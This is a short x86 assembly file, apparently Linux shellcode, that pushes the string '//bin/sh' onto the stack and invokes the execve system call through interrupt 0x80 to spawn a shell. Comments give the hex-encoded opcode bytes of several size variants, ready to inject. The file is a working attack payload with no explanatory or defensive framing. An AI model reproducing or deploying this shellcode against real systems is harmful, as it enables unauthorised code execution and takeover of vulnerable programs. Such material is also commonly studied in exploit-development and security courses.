
;mov		eax, 0xff
;mov		ebx, 0xff
;mov		ecx, 0xff
;mov		edx, 0xff

;xor ebx, ebx


; if everything is already null this is not needed
;xor 		ecx, ecx
;xor 		edx, edx
;xor		eax, eax


; put a null on the stack
push eax

; put //bin/sh\00 on the stack
push	"n/sh"
push	"//bi"

mov 	ebx, esp
;push 	ebx
mov		al, 0xb
int		0x80

; 31c050686e2f7368682f2f626989e353b00bcd80

;682f736800682f62696e89e3b00bcd80
;50686e2f7368682f2f626989e3b00bcd80
